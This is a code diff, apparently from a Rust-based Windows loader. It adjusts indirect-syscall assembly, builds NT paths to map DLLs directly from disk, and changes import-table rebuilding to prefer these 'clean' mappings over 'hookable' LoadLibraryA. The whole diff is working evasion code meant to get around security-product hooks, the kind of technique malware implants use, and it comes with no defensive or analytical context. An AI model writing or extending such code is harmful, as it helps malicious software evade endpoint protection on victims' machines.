@@ -381,7 +381,7 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             "and rax, -16",
             "sub rsp, rax",
             "test {nstack}, {nstack}",
-            "jz 2f",
+            "jz 4f",
             "mov rcx, {nstack}",
             "mov rsi, {stack_ptr}",
             "lea rdi, [rsp + 0x28]",
@@ -478,7 +478,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
         let sys_ntopenfile = get_syscall_id("NtOpenFile")?;
         
         use std::os::windows::ffi::OsStrExt;
-        let mut nt_path = format!(r"\??\{}\System32\{}", sysroot, dll_name).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
+        let mut nt_path = format!(r"\??\{}", path_str).encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
         
         let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
         obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
@@ -605,8 +605,15 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 }
             }
         } else {
-            let h_kernel = winapi::um::libloaderapi::LoadLibraryA(dll_name_ptr);
-            h_kernel as *mut _
+            // Prefer a clean map; fall back to hookable LoadLibraryA only if the
+            // DLL is not in System32 or clean-mapping fails for another reason.
+            match map_clean_dll(&dll_lower) {
+                Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
+                Err(_) => {
+                    let h = winapi::um::libloaderapi::LoadLibraryA(dll_name_ptr);
+                    h as *mut _
+                }
+            }
         };
         
         if !dep_handle.is_null() {
